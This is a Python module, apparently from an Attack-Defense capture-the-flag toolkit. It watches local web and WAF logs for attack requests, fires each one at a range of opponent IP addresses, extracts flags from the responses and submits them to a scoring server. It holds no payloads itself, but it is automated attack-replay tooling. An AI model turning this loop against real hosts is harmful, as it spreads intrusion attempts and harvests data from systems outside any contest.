#!/usr/bin/env python3
"""Autonomous copilot loop for Attack-Defense CTF.

Continuously runs:
  1. Real-time web log sniffer + WAF intercept capture
  2. Instant multi-threaded & rate-limited auto-replay against opponent IP ranges
  3. Automatic flag extraction and submission to scoring engine
  4. Periodic SLA health verification
"""

import concurrent.futures
import ipaddress
import json
import os
import re
import time
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path
from typing import List, Optional, Set

from .colors import Colors, colorize, print_banner, safe_print
from .patterns import ATTACK_RULES, COMBINED_LOG_REGEX, COMMON_LOG_REGEX, FLAG_REGEX
from .scanner import get_db, now_iso

DB_DEFAULT = os.path.expanduser("~/.adctf/state.db")


def expand_target_ips(target_spec: str) -> List[str]:
    """Expand IP specifications like 10.60.1-20.1 or 10.10.1.1-10.10.1.20."""
    targets = []
    if not target_spec:
        return targets

    if "-" in target_spec and re.match(r"^\d+\.\d+\.\d+-\d+\.\d+$", target_spec):
        o1, o2, start_o3, end_o3, o4 = map(int, re.match(r"^(\d+)\.(\d+)\.(\d+)-(\d+)\.(\d+)$", target_spec).groups())
        for o3 in range(start_o3, end_o3 + 1):
            targets.append(f"{o1}.{o2}.{o3}.{o4}")
    elif "-" in target_spec and re.match(r"^\d+\.\d+\.\d+\.\d+-\d+\.\d+\.\d+\.\d+$", target_spec):
        start_ip, end_ip = target_spec.split("-")
        s_int, e_int = int(ipaddress.IPv4Address(start_ip)), int(ipaddress.IPv4Address(end_ip))
        for ip_int in range(s_int, e_int + 1):
            targets.append(str(ipaddress.IPv4Address(ip_int)))
    else:
        targets = [target_spec]
    return targets


def run_autopilot(
    targets_spec: str = "",
    submit_url: Optional[str] = None,
    token: Optional[str] = None,
    log_file: Optional[str] = None,
    waf_capture: str = "/tmp/waf_captured.jsonl",
    port: int = 80,
    threads: int = 10,
    db_path: str = DB_DEFAULT,
    sla_check_interval: float = 30.0,
) -> int:
    """Run the complete autonomous copilot loop."""
    log_candidates = [
        log_file,
        "/var/log/nginx/access.log",
        "/var/log/apache2/access.log",
        "access.log",
    ]
    log_path = next((p for p in log_candidates if p and os.path.isfile(p)), None)

    targets = expand_target_ips(targets_spec)

    print_banner("AD-CTF Autopilot / Operator Mode", "Autonomous Defense Radar + Auto-Replay + Auto-Submit")
    safe_print(f"[*] Access Log       : {colorize(log_path or 'Not active (waiting)', Colors.GREEN if log_path else Colors.YELLOW)}")
    safe_print(f"[*] WAF Capture      : {colorize(waf_capture, Colors.CYAN)}")
    safe_print(f"[*] Opponent Targets : {colorize(f'{len(targets)} teams ({targets_spec})' if targets else 'Disabled (no targets)', Colors.YELLOW)}")
    safe_print(f"[*] Auto-Submit Flag : {colorize(submit_url if submit_url else 'Disabled', Colors.CYAN)}")
    safe_print(f"[*] Status           : {colorize('AUTONOMOUS COPILOT ACTIVE', Colors.BOLD + Colors.BRIGHT_GREEN)}")
    safe_print(colorize("-" * 75, Colors.DIM))
    safe_print(colorize("[*] Duduk santai, biarkan Autopilot bekerja. Tekan Ctrl+C untuk berhenti.\n", Colors.WHITE))

    conn = get_db(db_path)
    whitelist_ips = {"127.0.0.1", "::1", "localhost"}
    seen_flags: Set[str] = set()
    last_sla_check = 0.0

    def check_sla_quick():
        try:
            req = urllib.request.Request("http://127.0.0.1/", headers={"User-Agent": "Autopilot-SLA/1.0"})
            with urllib.request.urlopen(req, timeout=2.0) as resp:
                if 200 <= resp.status < 400:
                    safe_print(f" [{datetime.now().strftime('%H:%M:%S')}] {colorize('[SLA HEALTH: OK (200)]', Colors.BOLD + Colors.GREEN)} Web server berjalan normal.")
                else:
                    safe_print(f" [{datetime.now().strftime('%H:%M:%S')}] {colorize(f'[SLA ALERT: HTTP {resp.status}]', Colors.BG_RED + Colors.BOLD + Colors.WHITE)} Beritahu temanmu!")
        except Exception as e:
            safe_print(f" [{datetime.now().strftime('%H:%M:%S')}] {colorize('[SLA DOWN! ERROR]', Colors.BG_RED + Colors.BOLD + Colors.WHITE)} Web crash ({e})! Beritahu temanmu!")

    def fire_target(tip: str, method: str, uri: str, body: Optional[str] = None):
        url = f"http://{tip}:{port}{uri}"
        try:
            data = body.encode("utf-8") if (body and method.upper() in ("POST", "PUT", "PATCH")) else None
            headers = {"User-Agent": "Security-Audit-Replay/2.0"}
            if data:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            req = urllib.request.Request(url, data=data, method=method.upper(), headers=headers)
            with urllib.request.urlopen(req, timeout=3.0) as resp:
                resp_body = resp.read().decode("utf-8", errors="replace")
                return tip, FLAG_REGEX.findall(resp_body)
        except Exception:
            return tip, []

    def submit_single(fl: str):
        if not submit_url:
            return
        try:
            payload = json.dumps({"flag": fl, "token": token}).encode("utf-8")
            req = urllib.request.Request(submit_url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "Autopilot-Submitter/2.0"}, method="POST")
            with urllib.request.urlopen(req, timeout=3.0) as resp:
                res = resp.read().decode("utf-8")
                safe_print(f"   └─ 🚀 {colorize('FLAG SUBMITTED:', Colors.BRIGHT_MAGENTA)} {colorize(fl, Colors.BRIGHT_GREEN)} -> {res[:40]}")
        except Exception as e:
            safe_print(f"   └─ ⚠️  Flag Submit Error: {e}")

    def trigger_replay(method: str, uri: str, body: Optional[str] = None):
        if not targets:
            return
        safe_print(f"   ⚡ {colorize(f'AUTOPILOT: Menembakkan balik payload ke {len(targets)} tim lawan...', Colors.CYAN)}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
            futs = [pool.submit(fire_target, tip, method, uri, body) for tip in targets]
            for fut in concurrent.futures.as_completed(futs):
                tip, flags = fut.result()
                for fl in flags:
                    if fl not in seen_flags:
                        seen_flags.add(fl)
                        safe_print(f"   🚩 {colorize(f'FLAG DICURI DARI {tip}:', Colors.BOLD + Colors.BRIGHT_GREEN)} {colorize(fl, Colors.BOLD + Colors.BRIGHT_WHITE)}")
                        with open("captured_flags.txt", "a", encoding="utf-8") as ff:
                            ff.write(f"[{datetime.now().strftime('%H:%M:%S')}] {tip} -> {fl}\n")
                        submit_single(fl)

    # Open log file if available
    f_log = None
    if log_path:
        f_log = open(log_path, "r", encoding="utf-8", errors="replace")
        f_log.seek(0, os.SEEK_END)

    f_waf = None
    if os.path.isfile(waf_capture):
        f_waf = open(waf_capture, "r", encoding="utf-8", errors="replace")
        f_waf.seek(0, os.SEEK_END)

    try:
        while True:
            # SLA check loop
            if time.time() - last_sla_check > sla_check_interval:
                check_sla_quick()
                last_sla_check = time.time()

            has_activity = False

            # 1. Read from WAF capture JSONL (high-precision blocked payloads)
            if f_waf or os.path.isfile(waf_capture):
                if not f_waf:
                    f_waf = open(waf_capture, "r", encoding="utf-8", errors="replace")
                    f_waf.seek(0, os.SEEK_END)
                waf_line = f_waf.readline()
                if waf_line:
                    has_activity = True
                    try:
                        wdata = json.loads(waf_line.strip())
                        ts = wdata.get("timestamp", datetime.now().strftime("%H:%M:%S"))
                        ip = wdata.get("ip", "-")
                        method = wdata.get("method", "GET")
                        uri = wdata.get("uri", "/")
                        rule = wdata.get("rule", "WAF-BLOCK")
                        body = wdata.get("body", "")

                        safe_print(f"\n[{colorize(ts, Colors.DIM)}] {colorize(' [WAF INTERCEPT] ', Colors.BG_RED + Colors.BOLD + Colors.WHITE)} Dari {colorize(ip, Colors.BOLD + Colors.BRIGHT_WHITE)} [{colorize(rule, Colors.BRIGHT_RED)}]")
                        safe_print(f"   Target: {method} {uri}")
                        trigger_replay(method, uri, body)
                    except Exception:
                        pass

            # 2. Read from Access Log
            if f_log or (log_path and os.path.isfile(log_path)):
                if not f_log:
                    f_log = open(log_path, "r", encoding="utf-8", errors="replace")
                    f_log.seek(0, os.SEEK_END)

                line = f_log.readline()
                if line:
                    has_activity = True
                    line_str = line.strip()[:8192]
                    m = COMBINED_LOG_REGEX.match(line_str) or COMMON_LOG_REGEX.match(line_str)
                    ip, method, uri, status = "-", "GET", "/", "200"
                    if m:
                        d = m.groupdict()
                        ip = d.get("ip", "-")
                        method = d.get("method", "GET")
                        uri = d.get("uri", "/")
                        status = d.get("status", "200")

                    if ip not in whitelist_ips:
                        # Decode
                        dec_uri = uri
                        for _ in range(3):
                            try:
                                d_unq = urllib.parse.unquote(dec_uri)
                                if d_unq == dec_uri:
                                    break
                                dec_uri = d_unq
                            except Exception:
                                break

                        inspect_target = f"{method} {uri} {dec_uri} {line_str}"
                        matched = []
                        for cat, sev, rx, desc in ATTACK_RULES:
                            if rx.search(inspect_target):
                                matched.append((cat, sev, desc))

                        if matched:
                            ts = datetime.now().strftime("%H:%M:%S")
                            cat_str = ", ".join(dict.fromkeys(x[0] for x in matched))
                            badge = colorize(" [CRITICAL:EXPLOIT] ", Colors.BG_RED + Colors.BOLD + Colors.WHITE) if any(x[1] == "CRITICAL" for x in matched) else colorize(" [HIGH:ATTACK] ", Colors.BG_YELLOW + Colors.BOLD + Colors.BLACK)

                            safe_print(f"\n[{colorize(ts, Colors.DIM)}]{badge} Dari {colorize(ip, Colors.BOLD + Colors.BRIGHT_WHITE)} [{colorize(cat_str, Colors.BRIGHT_RED)}]")
                            safe_print(f"   Payload: {colorize(dec_uri[:75], Colors.BRIGHT_RED)}")
                            trigger_replay(method, uri)

            if not has_activity:
                time.sleep(0.1)

    except KeyboardInterrupt:
        safe_print("\n[STOP] Autopilot dinonaktifkan.")
    finally:
        if f_log:
            f_log.close()
        if f_waf:
            f_waf.close()
        conn.close()
    return 0
